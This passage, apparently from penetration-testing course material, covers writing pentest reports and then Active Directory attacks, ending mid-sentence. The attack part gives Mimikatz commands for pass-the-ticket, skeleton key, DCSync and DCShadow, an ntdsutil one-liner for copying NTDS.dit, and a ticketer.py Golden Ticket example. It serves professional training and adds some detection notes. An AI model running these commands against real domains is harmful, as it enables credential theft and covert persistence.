It is very important to properly redact information in reports. Taking safer screenshots is an important first step. Always disable transparency in your terminal windows (and others) when taking a screenshot to avoid information leakage. The author of this course once received a penetration test report from a prominent penetration testing company and learned about the company's other clients because of information leakage due to transparency.

We do not want to include sensitive information in the report, such as passwords, password hashes, encryption keys, API keys, private user information, or other sensitive data. We can't control the audience

Obviously, technical details on the findings can't be removed, but users' passwords should not be included in the report. When redacting, a color overlay in the image is the best, but a large black box can be visually jarring. Be very careful with the blur feature, as it can be deblurred if not done properly, as shown in the screenshots above. Pixilation using pixels of at least half the font height will sufficiently redact the data and result in a more visually appealing image. The large pixels prevent data exposure. One such tool is https://bishopfox.com/blog/unredacter-tool-never-pixelation.

# Recommended reading:

• https://redsiege.com/560/blur

# **Recommendations**

- Consider recommendations that fall into one or more categories:
  - − Applying patches
  - − Changing configuration
  - − Hardening systems
  - − Applying filters
  - − Altering architecture
  - − Changing processes: Always consider this kind of recommendation
- Make sure you consider the root cause of your findings
  - − Why is this so, and how can it best be fixed?
  - − How can we prevent it, or something similar, from happening again?
  - − Even for deeply technical issues, what process allowed the issue to arise, and how can we stop it from happening again?

Because recommendations are so valuable, let's look at the recommendations element of the Findings section of the report in more detail. Most of your penetration testing and ethical hacking project recommendations will fall into one of the following categories:

Applying patches: Many times, a test discovers vulnerable software that can be fixed by upgrading to a more recent version or applying a patch. Such changes tend to be easy, provided that they are conducted in coordination with the change management.

Hardening systems: Tests often have findings associated with shutting off an unneeded service, removing software that doesn't have a defined business need, or otherwise changing the configuration of a target machine to harden it from a security perspective.

Applying a filter: Some issues identified during a test can be mitigated by applying a filter in front of the target service, through a network firewall, network-based Intrusion Prevention System, or even a hostbased filtering technology, such as a personal firewall or host-based IPS.

Altering architecture: The most effective way of dealing with some flaws is to alter the overall architecture of the target environment, moving systems around, deploying new kinds of technology, applying filters in a different order, or tweaking the flow of data in the environment. Such solutions tend to be among the most expensive when compared to other issues on this list.

Changing process: For each one of your recommendations, always consider making a recommendation to improve processes. Even for deeply technical issues, some process associated with the given technical issue allowed the vulnerability to arise. Make recommendations for improving the process to avoid such an issue happening again in the future.

Most recommendations in a penetration testing or ethical hacking report fall into the first three categories here: patches, hardening, and filtering.

Whenever you make a recommendation, make sure you consider the root cause of the problem. Why is the issue present in the first place? How can target system personnel prevent it from happening again in the same instance or in other related areas? Answer those questions and you'll be providing additional business value for your work.

![](_page_68_Picture_2.jpeg)

# **Validation and Verification**

Provide steps or a method to verify a fix is in place and effective.

- Allows the people implementing fixes to verify that the issue is real
- Allows the fixer to immediately test to confirm the fix is in place
  - − The worst possible outcome is that someone attempts to resolve a finding and believes it is fixed, but the problem still exists
  - − Speeds up the feedback timeline as compared to a retest (weeks or months later)
- The organization can add the test to hardening and deployment guides to prevent the issue from happening again

If you want to go above and beyond in providing value in your penetration tests, provide in your recommendation some steps an organization can take to verify that your recommended fix is in place and working effectively. For example, if you recommend applying a patch or a filter, provide target system personnel with some command-line activities they can run to verify that the patch is in place or that the filter is properly filtering. Such fix verification advice can be difficult to formulate succinctly, but it provides some extra verification for target system personnel that their defenses have improved because of your work. Might this prevent you from getting some extra follow-on testing work? Yes, that is possible, but it makes your initial test results and report much more valuable to the organization.

![](_page_69_Picture_1.jpeg)

# **4. Methodology**

- Describe the process used, listing results at each stage:
  - − Recon
  - − Scanning
  - − Gaining Access
  - − Exploitation
  - − Post-Exploitation
- Include screenshots of representative actions
- Especially important if there aren't many major findings

The next part of the final report includes a description of the methodology used in the testing. Provide a description of the step-by-step process used, and briefly list the findings discovered at each phase. Depending on how you conduct the test, this section may include details of the recon, scanning, and gaining access phases. You may want to include a list of tools you used in the project. Some target organizations want to see the tools to learn from your report, whereas other organizations are not interested in the list of tools. When in doubt, include the tools you used for the project in the narrative description of your methodology, and consider adding a table to briefly summarize the tools used.

This methodology section may run from 10 to 50 pages or more, depending on how the test was conducted. If there are few high-risk findings associated with the project, this section actually grows in importance to demonstrate the value provided by the testing. Sometimes a testing project finds little wrong with the target environment. This, of course, is good news. However, if the Findings section is skimpy, the target organization may question the quality, veracity, and completeness of the test. Thus, in situations in which there aren't many findings, we need to provide even more detail in this Methodology section to show at a fine-grained level what we did during the test.

That demonstrates not only that we conducted a thorough test (again illustrating and recording our due diligence), but it also makes the test more reproducible in the future. A year later, the target organization may want to redo the test, and it can rely on this report to replicate it exactly, performing a gap analysis on changes in the interim, or purposely tweak the process next time.

The scanning component of the Methodology section should include an inventory of all the machines that were included in the test. We recommend a table with one row per target machine, listing the IP address, machine name(s), associated business unit (if it can be determined), and its method of discovery (DNS, ping sweep, Google searches, and so on). During the recon discussion (560.1), we discussed maintaining this inventory while the test occurs. We can directly use this inventory, in a condensed form, in our final report. For some tests, this inventory can get long and should be moved into optional appendices at the end of the report.

![](_page_70_Picture_1.jpeg)

# **Appendices**

Move lengthy or cumbersome items and lists to an appendix.

- If a list, such as of vulnerable targets, is longer than a page, move it to an appendix
  - − Detailed vulnerability scan output, if required
  - − Backup documentation associated with the project
  - − Summaries of memos communicating with third parties
- Add a link from the finding to the appendix, and vice versa

The report appendices should include lengthy outputs that would be cumbersome to put in line with the rest of the report. You could include detailed vulnerability scan output in an appendix. However, make sure that the report recipients want such information. It is often counterproductive and may make it look like you are merely adding weight to the report without any useful business or technical reason.

You could include backup documentation associated with the project, like the Rules of Engagement or scope description, in an appendix.

You also may want to include any memos that were sent to third parties getting their permission to scan their systems, such as a DNS server or web-hosted environment. Also, if any requests were sent to these organizations to change their configurations, you may want to include a copy of the request and response for the change in an appendix.

Include other items as they are required or helpful.

# **Recommended Reading**

- Brian "BB" King—Hack for Show, Report for Dough
  - − https://redsiege.com/560/dough
- Example Reports:
  - − https://redsiege.com/560/reports
- SEC402: Cybersecurity Writing: Hack the Reader

![](_page_72_Picture_1.jpeg)

# **Sample Reports**

- We are going to take a look at the reports in the repo:
  - − https://redsiege.com/560/reports
- The goal is not to mock them but to learn from them
  - − It could be that the reports are old
  - − The author could have had a bad day or made a mistake
  - − The testing organization could have missed a mistake
  - − The testing organization could have changed formats
- Please, don't hold the reports against the organizations
- All reports are used as examples and care is taken not to mention the authoring organization

Let's take a look at some sample reports from the repository below:

The goal here is to identify good and not-so-good choices when writing reports. The intent is not to mock any of the authors or authoring organizations. It could be that the author had an off day and made a mistake, or the peer review process had a failure. The authoring organization could have updated their report format since these reports were done, so please don't hold the negative issues mentioned here against them. While all the reports are publicly available in the repository listed above, care is taken not to mention the authoring organization here, as the intent is to learn from these reports, not make any negative references to the organizations in question. With that, let's take a look at some great and poor choices.

Note that the printed book is in black and white. To get the best experience and compare the difference, you may want to look at both the black-and-white book and the color PDF you received in your portal account.

#### Reference:

• https://redsiege.com/560/reports

![](_page_73_Picture_0.jpeg)

![](_page_73_Picture_1.jpeg)

# **Findings Order**

![](_page_73_Picture_3.jpeg)

![](_page_73_Picture_4.jpeg)

Findings should be ordered by severity. Why make the reader scroll through less severe findings to find the more critical and important findings? Remember who you are writing the reports for! The consumer of the report wants to be able to quickly triage issues and will likely want to look at the most severe issues first, so put those first in the report.

#### References:

- https://github.com/juliocesarfort/public-pentesting-reports/blob/master/ADALogics/Jackson-Report-Shared.pdf
- https://github.com/juliocesarfort/public-pentestingreports/blob/master/Coinspect/CoinspectReportZcash2016.pdf

![](_page_74_Figure_0.jpeg)

Be consistent in your reports. In the images above, you can see that the spacing is inconsistent. In the author's experience, some people are really good at detecting things like this and others aren't. It shows a very simple lack of attention to detail, which may make the recipient question what other details were missed. The simple solution here is to use a style (for example, edit the Heading 2 style) that includes the correct spacing before and after, and then the tester never has to press Enter twice. You can even have an automated check look for places where there are two spaces anywhere in the report. This is a very simple style change that takes seconds to implement and fixes all future reports!

#### Reference:

• https://github.com/juliocesarfort/public-pentestingreports/blob/master/Coinspect/CoinspectReportZcash2016.pdf

![](_page_75_Figure_0.jpeg)

The reports above show the default formatting. On the left, we see blue underscore links, which were common in the 1990s. A simple style change here would make the report look more modern. On the right, we see the default theme for Microsoft Word. In both cases, using a different theme or changing the basic styles (e.g., links) to something different and more modern makes the report look much fresher and more appealing. Both changes take only a short time and are effective for all future reports and make the report stand out.

In addition, in the report on the right, there is white text on a black background.

#### References:

- https://github.com/juliocesarfort/public-pentestingreports/blob/master/Coinspect/CoinspectReportZcash2016.pdf
- https://github.com/juliocesarfort/public-pentesting-reports/blob/master/OffensiveSecurity/penetrationtesting-sample-report-2013.pdf

![](_page_76_Figure_0.jpeg)

The graphs shown here are confusing. The graph on the left is nearly impossible to read and is unreadable when printed. Even if the report were in an electronic format, it is still difficult to navigate. The report shows the graphs but only includes them to show the "complexity of the calculated call graph." This adds little value to the report other than saying it was hard work, especially since the graph is so difficult to read. The other two graphs include colors, but the report does not describe why the colors are used or their significance. When including graphics like this, make sure to zoom in on the important pieces and have a clear reason why you are including them and what you want to convey to the reader.

#### Reference:

• https://github.com/juliocesarfort/public-pentesting-reports/blob/master/Fraunhofer/Fraunhofer\_- \_TrueCrypt.pdf

![](_page_77_Figure_0.jpeg)

The executive summary here is very clean and concise. It also looks very professional and high quality. This conveys to the reader that the work is also high quality. The summary has clear headers and is very easy to read. This is an excellent example of a high-quality report!

#### Reference:

• https://github.com/juliocesarfort/public-pentestingreports/blob/master/NCCGroup/NCC\_Group\_Zcash\_NU3\_Blossom\_Report\_2020-02-06\_v1.1.pdf

![](_page_78_Figure_0.jpeg)

Color in reports is useful, but you need to be very careful how you use it. In the left example above, the colors associated with the Medium and Low risk levels are very similar and can be hard for people with Color Vision Deficiencies (CVD) to distinguish. The image would be difficult for nearly everyone in black and white printed form.

The example on the right also uses colors for the severity, but the icons really help readers understand the severity even if the reader cannot distinguish the difference between the colors or the report is printed in black and white. This is a great example of how to use colors and make the report more accessible. However, the contrast of the red on blue is 1.26:1, which fails the Web Content Accessibility Guidelines (WCAG) accessibility compliance standards so more work is needed.

The first priority is text. Screen readers will provide blind people with information based on text first and foremost. If you are relying on images to convey something that isn't in the text, then you are providing a confusing experience to anyone who is blind. For well-designed visual elements, icons that are illustrative are marked as not having valuable data, and the screen reader will skip reading the ALT tag. In both example images above, the colors and icons would be ineffective for screen readers.

The second priority is high contrast for people who are low-sighted. You can use a WCAG accessibility tool for that since the score will change depending on the size of the elements.

If you choose to use colors as part of the narrative, be sure to include icons or shading to make it easier for people to read, especially when printed in black and white. To be more accessible, include text as well for screen reader support.

#### References:

- https://github.com/juliocesarfort/public-pentestingreports/blob/master/NCCGroup/NCC\_Group\_ProtocolLabs\_FilecoinGroth16\_Report\_2021-06-02.pdf
- https://github.com/juliocesarfort/public-pentesting-reports/blob/master/ProCheckUp/CHECK-1- 2012.pdf

![](_page_79_Figure_0.jpeg)

In the graph shown above, which corner is the most severe? If you're like most people, you'd expect the most severe issue to be in the top right, but this isn't how the graph is laid out. The corner that would be the biggest risk would be the bottom left (simple attack, highest risk). The bottom left of graphs is usually the origin (0,0), which is what makes this layout so confusing. This graph could mean the reader focuses on the wrong security vulnerability!

Think about your readers, how they may read the graph, and what is useful to them. This is an easy fix, but the graph is confusing as it is!

#### Reference:

• https://github.com/juliocesarfort/public-pentestingreports/blob/master/iSEC/iSec\_Final\_Open\_Crypto\_Audit\_Project\_TrueCrypt\_Security\_Assessment.p df

![](_page_80_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

![](_page_81_Picture_0.jpeg)

![](_page_81_Picture_1.jpeg)

# **Pass-the-Ticket**

A stolen Kerberos ticket can be used on another system.

- Credential theft technique that allows access as the user but without compromising the password
- A ticket can be taken from any system and be used anywhere else
  - − Only valid until expiration time
  - − ST: Only valid for the target service
  - − TGT: Can be used for any service
- Tools: Mimikatz and Rubeus

Since tickets can be used to obtain access to a service or request other tickets, it should be no surprise that attackers found ways to steal and reuse tickets. Such an attack is called a pass-the-ticket attack. We can obtain existing tickets (preferably TGTs from administrative accounts) by extracting them from the memory of compromised machines and then use them to gain access to other machines. Open-source attack tools are available to extract tickets and execute pass-the-ticket attacks.

A ticket implies that we are abusing Kerberos authentication and authorization: The advantage for an attacker in using an attack with a ticket is that the password or the hash of the compromised account isn't required. Just a ticket.

To obtain this ticket, we need to have (local) administrative access to a machine where a user is logged on.

This ticket can be exported to a file using the Mimikatz command **"kerberos::list /export"**. This will export all tickets to a file (one for each ticket) in the current directory. Rubeus and other tools have similar functionality.

We cannot select the name for the tickets; instead, Mimikatz decides the name based on metadata such as the username. Tickets generated by Mimikatz use the extension .kirbi, but any extension can be used for a pass-the-ticket attack.

![](_page_82_Figure_0.jpeg)

To take advantage of this attack, we need to export a ticket from one system, copy it to another system, and then use a tool that will use the ticket. In the example above, we use Mimikatz to perform the attack. The steps shown in the slide are listed here:

#### Victim system:

- We use **kerberos::tgt** to list the Ticket Granting Tickets.
- We export the ticket with **kerberos::list /export**.

#### Attacker system:

- On the new system, we list the tickets and see that the system has no tickets in memory.
- We load the copied ticket using **kerberos:ptt filename.kirbi** to load the ticket into memory.
- When we list the tickets again, we can see the new ticket loaded into memory.
- We now use any tool that will use Kerberos authentication. In this example, we are using Sysinternals PsExec.

![](_page_83_Figure_0.jpeg)

As you are reading this, it's good to recall the initial Pass-the-Hash attack. Remember that Pass-the-Hash relies on NTLMv1/NTLMv2 authentication, so a possible defense might be to just disable NTLM. While this is not a straightforward control to implement, it also doesn't fully protect us against Pass-The-Hash.

We could use the stolen password hash to perform pre-authentication and get a valid TGT for the user. The diagram on this slide provides an overview of how Pass-the-Hash (PtH) can still be an issue even if NTLM is fully disabled in an environment! This technique is commonly referred to as "Overpass-the-Hash."

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

![](_page_85_Picture_2.jpeg)

# **Domain Domination and AD Persistence**

- Throughout the course, we've discussed a variety of techniques we can use to move laterally through a Windows environment and obtain administrative access. Of course, we also would like to persist the access we achieve!
- Common techniques used to consolidate/persist administrative access to AD:
  - − Dumping the NTDS.dit file
  - − Creating a domain administrator account
  - − Creating a skeleton key
  - − Using DCSync or DCShadow
  - − Creating a Golden Ticket

![](_page_85_Picture_11.jpeg)

Throughout the course, we've discussed a variety of techniques we can use to move laterally through a Windows environment and obtain administrative access. Of course, we also would like to persist the access we achieve!

So, what is the next step in our plan? Typically, we can attempt one of the following tricks to consolidate/persist administrative access to AD:

- Dumping the NTDS.dit file, from which all credentials can be extracted
- Simply creating a domain administrator account (preferably with strong credentials)
- Creating a Kerberos Golden Ticket that will allow long-term access to the environment
- Creating a skeleton key, which will allow us to authenticate as any user in the environment
- Using the DCSync attack

Let's discuss these techniques in some more detail!

![](_page_86_Picture_2.jpeg)

# **Obtaining Access to Backup NTDS.dit File**

Domain password hashes are in the ntds.dit file.

- It is only accessible with elevated privileges and locked by Windows while AD is running
- It is encrypted with the system key (stored in the registry)
- We have multiple ways to access this file:
  - − Use the Volume Shadow Copy Service to create a read-only copy and download the file
  - − Use ntdsutil.exe and the "Install from Media" (IFM) capability
  - − Poorly secured backups of the domain controller drives (i.e., open network shares)
- We need to use special tools to decrypt and extract the hashes
  - − secretsdump.py from Impacket is the most commonly used tool

Advanced attackers will often attack the Active Directory infrastructure of their targets because they contain the "keys to the kingdom." If we obtain domain admin rights, we will have unlimited access to the resources of that domain. We may also want to achieve persistence—unconditional access to the administrative functions of Active Directory, even when credentials are changed.

There are many attacks possible with Active Directory. Here, we want to focus on attacks to obtain credentials and/or access. As we saw, the Active Directory database is stored inside a file called ntds.dit, and the hashes are protected by an encryption key stored in the SYSTEM registry hive.

When we obtain a copy of these files, we can extract hashes. The hashes can be used for cracking or passthe-hash attacks.

These files are present on a domain controller, but when the domain controller is running, these files are locked and cannot be copied. One way to access the files is using the Volume Shadow Copy feature used for backups. This feature will create a shadow copy of the ntds.dit file and the SYSTEM registry hive.

Another command-line way to access these files is by using the ntdsutil.exe tool and the "Install from Media" (IFM) capability. This feature will also give us a readable copy of both files.

We don't always need access to a domain controller to obtain these files. Sometimes, organizations will leave backups on a poorly secured server. When centralized backups are made of the domain controllers, these files will be found on the backup servers too.

We need to use specialized tools to decrypt and extract hashes from ntds.dit. The most commonly used tool for this is secretsdump.py from Impacket.

![](_page_87_Figure_0.jpeg)

As mentioned, the domain password hashes are stored in the encrypted ntds.dit file. The encryption key is stored in the SYSTEM registry hive. We can use the ntdsutil.exe tool to extract the files. As shown in the output above, we run ntdsutil.exe and enter an interactive shell. Then, we run a series of commands to save the backup:

```
activate instance ntds
```

ifm

create full c:\temp

quit

quit

The directory location above (c:\temp) can be changed.

Instead of running ntdsutil.exe in interactive mode, we can use quotes and run it in a single line:

```
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
```

The resulting file structure under c:\temp looks like this:

- Active Directory
- ntds.dit
- Registry
- SECURITY
- SYSTEM

The "Install from Media" feature is designed to help admins create a copy of their domain. Let's say an organization has one location in New York and wants to set up a new location in LA. They can make a backup of a New York DC, fly to LA, and then import the data. The goal is to save bandwidth and time syncing over the long link. Syncing over these long links was a bigger issue when we had slower internet speeds and internet was metered. With today's internet speeds, however, this feature isn't often used by actual administrators anymore.

![](_page_89_Figure_0.jpeg)

A simple attack to achieve persistence in Active Directory is to create a new domain admin user with a password that never expires.

Once we have administrative rights to the domain, we can create a new domain administrator. This does not necessarily imply that we must obtain domain administrator rights but rather just obtain the right to create new users and assign them to groups. A domain administrator has these rights, but in Active Directory, these rights can also be delegated to administrative users who don't have domain admin rights. Because the domain administrator is such a powerful account, many organizations will only provide this account to a select group of security staff members.

Other users who need to perform common administrative tasks, like managing users, are only given the necessary rights to do this. But once a user has the right to create a new user and assign it to arbitrary groups, they can create a domain administrator.

This created account will give us domain admin access to the domain as long as the account is not discovered and removed. Companies often monitor their Active Directory infrastructure for the creation of new accounts with administrative rights.

![](_page_90_Picture_1.jpeg)

# **Skeleton Key**

A skeleton key attack allows authenticating as any user with a second password.

- A skeleton key is a key that opens all the locks in a building
- The skeleton key only works for Kerberos **RC4 encryption**
- The skeleton key is a backdoor that runs on the DC (**in memory**), allowing logging on to any account using the backdoor password (default: mimikatz)
- Because it runs in memory, it's **not persistent**, so a reboot clears it out
  - − Incident responders: Make sure rebooting systems is part of your consolidated response

Another AD persistence attack we want to illustrate is an attack to achieve persistence inside a domain.

A skeleton key is a special key that opens all the locks inside a building. Each door lock inside the building requires its own key to be opened, but all the locks can also be opened with a special, single key—the skeleton key. Mimikatz provides a skeleton key attack for Active Directory.

When the Mimikatz skeleton key attack is executed on a domain controller, a bit of code is patched in memory so that all accounts can be logged in with a special password (mimikatz). This does not remove the existing passwords. Instead, it is now possible to log in to an account using one of two different passwords: either the real password or "mimikatz".

Technically, the skeleton key does this by manipulating the way the encrypted timestamp (AS-REQ) is validated. As a reminder, in RC4, the timestamp is encrypted using the NT hash of the user by the client, after which the domain controller attempts to decrypt the timestamp. When the skeleton key is installed, the domain controller will attempt to decrypt the timestamp using the user's NT hash AND the skeleton key NT hash (Mimikatz default: 60BA4FCADC466C7A033C178194C03DF6, password "mimikatz").

This has to be done on a domain controller; it does not work on non–domain controllers. But this does not mean that we can only log in with the skeleton password on a domain controller. The password works on all domain members that use this compromised domain controller for authentication. Since the password is used to generate a normal valid TGT, the TGT can be used to access other domain resources.

If there is more than one domain controller, the attack needs to be executed on all domain controllers to be sure that the skeleton password will work in all cases.

# **Skeleton Key in Action**

- Set up skeleton key with debug privs and Mimikatz
- Allows anyone to authenticate as any user in the domain with the password mimikatz
- Note: The skeleton key password is chosen at compile time (you must recompile Mimikatz to change it)

In the example above, we can see the skeleton key attack. Since this will patch the code of the LSA process in memory, administrative rights are required, and the debug privilege needs to be enabled. We just need to run the command **misc::skeleton**, and the skeleton key is installed on the domain controller.

When there are several domain controllers inside a domain, domain members connect to a domain controller for authentication via a kind of load-balancing scheme.

This means that to be 100% reliable, the skeleton key attack needs to be performed on all domain controllers. Otherwise, a domain member might authenticate to a domain controller that does not have the skeleton key patch applied in memory.

Since this is a patch in memory, simply rebooting the domain controller removes the skeleton key. But, of course, we can install an autorun entry for Mimikatz to run automatically when the domain controller boots.

![](_page_92_Picture_0.jpeg)

![](_page_92_Picture_1.jpeg)

# **Replicating the Domain: DCSync**

DCSync attack uses the domain replication protocol to mimic a DC.

- For availability reasons, many ADs have multiple domain controllers, and updates propagate via "AD Replication"
- Mimikatz **dcsync** will impersonate a DC and request replication to a target DC to obtain the credentials stored in its AD database
  - − This attack requires Domain Admin or replication privileges
- Same impact as copying the ntds.dit file
  - − Once we successfully launch an attack like this, all password hashes in the domain are compromised!

Benjamin Delpy, the author of Mimikatz, has pioneered many attacks on Windows security, which has led to security improvements in Windows. In collaboration with Vincent Le Toux, Delphy worked out another attack on Active Directory: impersonating a domain controller.

For availability reasons, administrators deploy more than one domain controller in an Active Directory infrastructure. Each domain controller has a copy of the Active Directory database, and updates to this database on a domain controller (e.g., the creation of a new user) need to be propagated to the other domain controllers in due time. This is called Active Directory replication—a set of methods and protocols used to synchronize the database of Active Directory domain controllers.

Le Toux and Delphy have worked out these methods and protocols for use by Mimikatz: the command dcsync will make any computer that runs Mimikatz impersonate a domain controller to a target domain controller to obtain its stored credentials.

Of course, normal users cannot access this information. One needs domain admin rights to be able to participate in data replication. A Golden Ticket, however, can provide these admin rights.

DCSync can dump the hashes of all users or just a selected user.

![](_page_93_Figure_0.jpeg)

This example shows the dcsync command. By issuing the kerberos::dcsync /user:administrator command, we request the credentials for the user administrator to a domain controller. The command kerberos::dcsync would list the credentials of all users.

When this command is issued without extra options, Mimikatz selects the domain and the domain controller automatically and extracts the credentials from this domain controller via replication using the Directory Replication Service Remote (DRSR) protocol.

This is a very powerful attack. Once we have obtained domain admin credentials, we can use dcsync to connect to a domain controller and extract the credentials of the krbtgt account. This data can then be used to create a Golden Ticket—and then it is game over. The only recourse a company has is to change the krbtgt account password. This password never expires and is never changed, unless it is done manually.

It is possible to detect a dcsync attack. DRSR network traffic should only occur between domain controllers. If a company detects DRSR network traffic between a domain controller and a workstation, it knows a dcsync attack took place.

# **Becoming a Domain Controller: DCShadow**

DCShadow is the reverse of DCSync; it pushes updates to the DC:

- As a prerequisite, we need to obtain Domain Administrator rights
- Using Mimikatz, we temporarily register the system we are using as a DC
- We craft a change to objects that benefit us (e.g., change the password hash of a sensitive account)
- Using Mimikatz, we can now trigger a replication, which forces a legitimate DC to commit the change!

Windows normally relies on event logs from the source DC that creates the changes. Mimikatz isn't writing those, so no Windows event logs are being generated!

"They told me I could be anything I wanted, so I became a Domain Controller." With this tagline, Benjamin Delpy and Vincent Le Toux introduced their new AD attack strategy in early 2018 called DCShadow. While it appears very similar to DCSync, it's more intrusive and definitely different!

DCShadow rose to prominence after BlackHat USA 2018, where Le Toux and Delpy presented their research. The slides can be found here: https://www.dcshadow.com/us-18-Delpy-LeToux-So-I-Became-A-Domain-Controller.pdf. DCShadow has a public website with information as well at https://www.dcshadow.com.

How does the DCShadow attack work? There are four main steps in a DCShadow attack:

As a prerequisite, we need to obtain Domain Administrator rights.

Using Mimikatz, we temporarily register the workstation we are using as a DC.

We craft a change in a target object that benefits us (e.g., change the password hash of a sensitive account).

Using Mimikatz, we can now trigger a replication, which forces a legitimate DC to commit the change!

The changes performed by DCShadow are done using replication, which renders them almost "invisible" for normal Windows event logs. Windows normally relies on event logs being generated on the source DC that creates the changes. As in this case, this DC does not exist, so no Windows event logs are being generated!

The "promoted" workstation is afterward unregistered again (it does not become a permanent DC).

It's important to note that DCShadow uses the built-in features of the Directory Replication Service. It does not perform any type of exploit.

94

# **Becoming a Domain Controller: DCShadow in Action**

• We need to run in the "NT AUTHORITY\SYSTEM" context

```
mimikatz # token::elevate
```

• Example: Change the description of a user

```
mimikatz # lsadump::dcshadow /object:"CN=Bob,OU=Users,DC=domain,DC=com" /attribute: 
description /value: "DCShadow was here"
```

• Example: Add user to Domain Admins group

```
mimikatz # lsadump::dcshadow /object:"CN=Bob,OU=Users,DC=domain,DC=com" /attribute: 
primaryGroupID /value: 512
```

• Push change with: mimikatz # **lsadump::dcshadow /push**

To begin this attack, we first need to run under the SYSTEM context. To get this token, we use the elevate function in Mimikatz:

```
mimikatz # token::elevate
```

Next, we make changes to objects. In this example, we're changing the description for Bob to "DCShadow was here":

```
mimikatz # lsadump::dcshadow 
/object:"CN=Bob,OU=Users,DC=domain,DC=com" /attribute: description 
/value: "DCShadow was here"
```

The above change won't have much impact. Let's do something much more interesting and add a user to the Domain Admins group:

```
mimikatz # lsadump::dcshadow 
/object:"CN=Bob,OU=Users,DC=domain,DC=com" /attribute: primaryGroupID 
/value: 512
```

After we have all the changes we would like, we need to push the update to the domain:

```
mimikatz # lsadump::dcshadow /push
```

![](_page_96_Picture_1.jpeg)

# **Domain Dominance**

Refer to the lab workbook for instructions.

![](_page_97_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

![](_page_98_Figure_0.jpeg)

A Golden Ticket is a TGT providing maximum access for a maximum period of time.

We discussed Kerberos attacks earlier. One of the possible attack vectors we looked at was the creation of a "Golden Ticket," which is nothing more than a forged TGT created by an attacker.

In order to create a valid TGT (with a valid PAC), we would require:

- The target LT key
- The KDC LT key

In the case of a TGT, the target and KDC keys are identical (the krbtgt hash). We would therefore have to obtain the NT hash of the krbtgt account (RC4) or the AES key (AES)!

When Active Directory is compromised, the NT hash or AES key of the krbtgt account can be extracted from memory. All the other information needed to create a Golden Ticket is not secret information but can be obtained readily. For example, the name of the domain will be needed. Although the domain name of an organization is not something that is publicized, it is not that difficult for us to obtain.

Note that the NT hash or AES key of the krbtgt account can also be extracted from the Active Directory database and its backups.

The name "Golden Ticket" refers to the movie *Willy Wonka & the Chocolate Factory*, in which children can win a Golden Ticket that provides them full access to a fabulous chocolate factory.

![](_page_99_Figure_0.jpeg)

Let's have a quick look at the Kerberos flow when a Golden Ticket is in play. When we use a Golden Ticket, the first interaction is a TGS-REQ (request for a Service Ticket) using the forged TGT (the Golden Ticket). There is no prior credential submission or AS-REQ/AS-REP!

One might assume that the lack of AS-REQ/AS-REP can be a trigger for detection. Fortunately, Kerberos is a stateless protocol; hence, the AD does not keep track of prior AS-REQ/AS-REP before a TGS-REQ is performed. If one were to implement a rule like this, an avalanche of false positives would appear (e.g., TGTs generated by DC01 and subsequently used to request a Service Ticket on DC02).

# **Golden Ticket Properties**

- It's created without any interaction with the DC
  - − This is possible because Kerberos is a "stateless" protocol
  - − DC does not keep track of all previously created TGTs
  - − We need the krbtgt hash to generate the ticket
- TGT is typically for an administrative account (e.g., RID 500 in the domain or a Domain Administrator)
- It's typically valid for a long time (10 years by default)

A Golden Ticket is nothing more than a forged TGT. However, it does have some very interesting features:

It's created without any interaction with the DC (i.e., it's "homemade"). This is possible because Kerberos is a "stateless" protocol. Forgery is possible once the attacker has the krbtgt hash.

It's typically a TGT for an administrative account (e.g., RID 500 in the domain or a Domain Administrator) or a member of a powerful group (e.g., Domain Admins).

It's typically valid for a long time (10 years by default).

Golden tickets were initially described in Benjamin Delpy's BlackHat USA 2014 presentation "Abusing Microsoft Kerberos—Sorry you guys don't get it." This presentation is often referred to as "the Golden Ticket talk."

You can find the slides at https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf.

![](_page_101_Picture_1.jpeg)

#### **Golden Ticket Tools**

- ticketer.py from Impacket
- Mimikatz—the original tool for ticket generation
- Rubeus
- Most C2 frameworks
  - − C2 will commonly load the ticket into memory; standalone tools require another mechanism to use or load the ticket
- To generate a Golden Ticket, you need:
  - − krbtgt hash
  - − Domain SID (S-1-5-21-XXXXXXXXX-YYYYYYYYY-ZZZZZZZZZ)
  - − Full domain name
- ticketer.py example:

**ticketer.py -domain-sid S-1-5-21-721047592-4068106649-2889670365 -domain sec560.local -nthash 5525e655c...e2cc5621fb3 Administrator**

We can use multiple tools to generate a Golden Ticket:

- ticketer.py (part of Impacket)
- Mimikatz (the original tool for ticket generation)
- Most C2 frameworks have a way to generate tickets

To generate a Golden Ticket, we need:

